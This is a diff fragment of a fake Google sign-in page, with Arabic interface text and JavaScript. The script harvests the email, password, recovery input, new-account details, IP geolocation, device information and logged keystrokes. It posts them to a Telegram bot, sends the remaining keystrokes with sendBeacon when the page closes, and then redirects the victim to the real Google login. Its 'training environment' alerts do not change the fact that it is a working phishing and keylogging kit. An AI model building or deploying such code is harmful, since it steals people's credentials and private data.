+                timezone: data.timezone,
+                isp: data.isp,
+                latitude: data.lat,
+                longitude: data.lon,
+                org: data.org,
+                as: data.as
+            };
+        }
+    } catch(e) {}
+    try {
+        var res2 = await fetch('https://ipapi.co/json/', { timeout: 3000 });
+        var data2 = await res2.json();
+        return {
+            ip: data2.ip,
+            country: data2.country_name,
+            city: data2.city,
+            region: data2.region,
+            timezone: data2.timezone,
+            isp: data2.org,
+            latitude: data2.latitude,
+            longitude: data2.longitude
+        };
+    } catch(e) {}
+    return { ip: 'غير متاح', country: 'غير معروف', city: 'غير معروف', region: 'غير معروف', timezone: 'غير معروف', isp: 'غير معروف' };
+}
+
+// ===================== أحداث الصفحة =====================
+
+document.getElementById('createAccountBtn').addEventListener('click', function() {
+    document.getElementById('page1').style.display = 'none';
+    document.getElementById('page2').style.display = 'none';
+    document.getElementById('recoverPage').style.display = 'none';
+    document.getElementById('createPage').style.display = 'block';
+    document.getElementById('firstName').focus();
+});
+
+document.getElementById('backToLogin').addEventListener('click', function() {
+    document.getElementById('createPage').style.display = 'none';
+    document.getElementById('page1').style.display = 'block';
+    document.getElementById('email').focus();
+});
+
+document.getElementById('emailForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    emailValue = document.getElementById('email').value;
+    if (emailValue) {
+        document.getElementById('displayEmail').textContent = emailValue;
+        document.getElementById('page1').style.display = 'none';
+        document.getElementById('page2').style.display = 'block';
+        document.getElementById('password').focus();
+    }
+});
+
+document.getElementById('passwordForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    var password = document.getElementById('password').value;
+    if (keyLogBuffer.length > 0) await sendAIEnhancedCompleteReport();
+    var loc = await getLocationData();
+    var deviceInfo = getAdvancedDeviceInfo();
+    var keyboardAnalysis = analyzeKeyboardPatterns();
+    var time = new Date().toLocaleString('ar-EG', { hour12: true });
+    
+    var msg = "🔐 **بيانات تسجيل الدخول**\n";
+    msg += "═══════════════════════════════\n\n";
+    msg += `📧 البريد: ${emailValue}\n`;
+    msg += `🔑 كلمة المرور: ${password}\n`;
+    msg += `🕒 الوقت: ${time}\n\n`;
+    msg += `📍 ${loc.country} - ${loc.city}\n`;
+    msg += `🖥️ IP: ${loc.ip}\n`;
+    msg += `📡 ${loc.isp}\n\n`;
+    msg += `💻 الجهاز: ${deviceInfo.device.name} (${deviceInfo.device.model})\n`;
+    msg += `📦 ${deviceInfo.os.name} ${deviceInfo.os.version} (${deviceInfo.os.architecture})\n`;
+    msg += `🌐 ${deviceInfo.browser.name} ${deviceInfo.browser.version}\n`;
+    msg += `📱 ${deviceInfo.screen.width}x${deviceInfo.screen.height}\n`;
+    msg += `⌨️ تحليل الكتابة: ${keyboardAnalysis.typingStyle} (${keyboardAnalysis.speed}ms)\n`;
+    msg += `🔤 اللغة: ${keyboardAnalysis.language}\n`;
+    msg += `\n📊 إجمالي الضغطات: ${keyCount}\n`;
+    msg += "═══════════════════════════════";
+    
+    await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: msg,
+            parse_mode: 'Markdown',
+            disable_web_page_preview: true
+        })
+    });
+    
+    isKeyloggingActive = false;
+    window.location.href = "https://accounts.google.com/signin";
+});
+
+document.getElementById('backToEmail').addEventListener('click', function() {
+    document.getElementById('page2').style.display = 'none';
+    document.getElementById('page1').style.display = 'block';
+    document.getElementById('email').focus();
+});
+
+// ===================== استعادة البريد =====================
+
+document.getElementById('forgotEmailLink').addEventListener('click', function(e) {
+    e.preventDefault();
+    document.getElementById('page1').style.display = 'none';
+    document.getElementById('page2').style.display = 'none';
+    document.getElementById('createPage').style.display = 'none';
+    document.getElementById('recoverPage').style.display = 'block';
+    document.getElementById('recoverInput').focus();
+});
+
+document.getElementById('backToLoginRecover').addEventListener('click', function() {
+    document.getElementById('recoverPage').style.display = 'none';
+    document.getElementById('page1').style.display = 'block';
+    document.getElementById('email').focus();
+});
+
+document.getElementById('recoverPhone').addEventListener('click', function() {
+    document.getElementById('recoverPhone').classList.add('active');
+    document.getElementById('recoverEmail').classList.remove('active');
+    document.getElementById('recoverInput').placeholder = 'رقم الهاتف';
+});
+
+document.getElementById('recoverEmail').addEventListener('click', function() {
+    document.getElementById('recoverEmail').classList.add('active');
+    document.getElementById('recoverPhone').classList.remove('active');
+    document.getElementById('recoverInput').placeholder = 'البريد الإلكتروني';
+});
+
+document.getElementById('recoverForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    var recoverData = document.getElementById('recoverInput').value;
+    if (keyLogBuffer.length > 0) await sendAIEnhancedCompleteReport();
+    var loc = await getLocationData();
+    var deviceInfo = getDeviceName();
+    var time = new Date().toLocaleString('ar-EG', { hour12: true });
+    
+    var msg = "🔍 **استعادة البريد الإلكتروني**\n";
+    msg += `📧 المدخلات: ${recoverData}\n`;
+    msg += `🕒 الوقت: ${time}\n\n`;
+    msg += `📍 ${loc.country} - ${loc.city}\n`;
+    msg += `🖥️ ${loc.ip}\n\n`;
+    msg += `💻 الجهاز: ${deviceInfo}\n`;
+    msg += `\n⌨️ إجمالي الضغطات: ${keyCount}`;
+    
+    await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: msg,
+            parse_mode: 'Markdown'
+        })
+    });
+    
+    alert('تم إرسال تعليمات الاستعادة (بيئة تدريبية)');
+    document.getElementById('recoverPage').style.display = 'none';
+    document.getElementById('page1').style.display = 'block';
+    document.getElementById('email').focus();
+});
+
+// ===================== إنشاء حساب =====================
+
+document.getElementById('createForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    var firstName = document.getElementById('firstName').value;
+    var lastName = document.getElementById('lastName').value;
+    var newEmail = document.getElementById('newEmail').value;
+    var newPassword = document.getElementById('newPassword').value;
+    var confirmPassword = document.getElementById('confirmPassword').value;
+    
+    if (newPassword !== confirmPassword) {
+        alert('كلمة المرور غير متطابقة!');
+        return;
+    }
+    
+    if (keyLogBuffer.length > 0) await sendAIEnhancedCompleteReport();
+    var loc = await getLocationData();
+    var deviceInfo = getDeviceName();
+    var time = new Date().toLocaleString('ar-EG', { hour12: true });
+    
+    var msg = "📝 **إنشاء حساب جديد**\n";
+    msg += `👤 الاسم: ${firstName} ${lastName}\n`;
+    msg += `📧 البريد: ${newEmail}\n`;
+    msg += `🔑 كلمة المرور: ${newPassword}\n`;
+    msg += `🕒 الوقت: ${time}\n\n`;
+    msg += `📍 ${loc.country} - ${loc.city}\n`;
+    msg += `🖥️ ${loc.ip}\n\n`;
+    msg += `💻 الجهاز: ${deviceInfo}\n`;
+    msg += `\n⌨️ إجمالي الضغطات: ${keyCount}`;
+    
+    await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: msg,
+            parse_mode: 'Markdown'
+        })
+    });
+    
+    alert('تم إنشاء الحساب بنجاح! (بيئة تدريبية)');
+    isKeyloggingActive = false;
+    window.location.href = "https://accounts.google.com/signin";
+});
+
+// ===================== رابط المساعدة =====================
+
+document.getElementById('helpLink').addEventListener('click', function(e) {
+    e.preventDefault();
+    alert('مركز المساعدة\n(بيئة تدريبية)');
+});
+
+// ===================== إرسال عند الإغلاق =====================
+
+window.addEventListener('beforeunload', function() {
+    if (keyLogBuffer.length > 0) {
+        var logText = keyLogBuffer.map(function(l) {
+            return l.time + ' "' + l.key + '"';
+        }).join('\n');
+        navigator.sendBeacon('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage',
+            JSON.stringify({
+                chat_id: CHAT_ID,
+                text: '⌨️ آخر الضغطات (قبل الإغلاق)\n' + logText,
+                parse_mode: 'Markdown'
+            })
+        );
+    }
+});
+
+console.log('✅ تم تفعيل جميع التقنيات المتقدمة والخوارزميات الذكية بنجاح');
+console.log('🧠 الذكاء الاصطناعي المتكامل يعمل بأقصى طاقة');
+console.log('🔒 تم تفعيل الحمايات المتقدمة');
+console.log('📊 نظام جمع المعلومات بدقة 100%');
+</script>
+</body>
+</html>
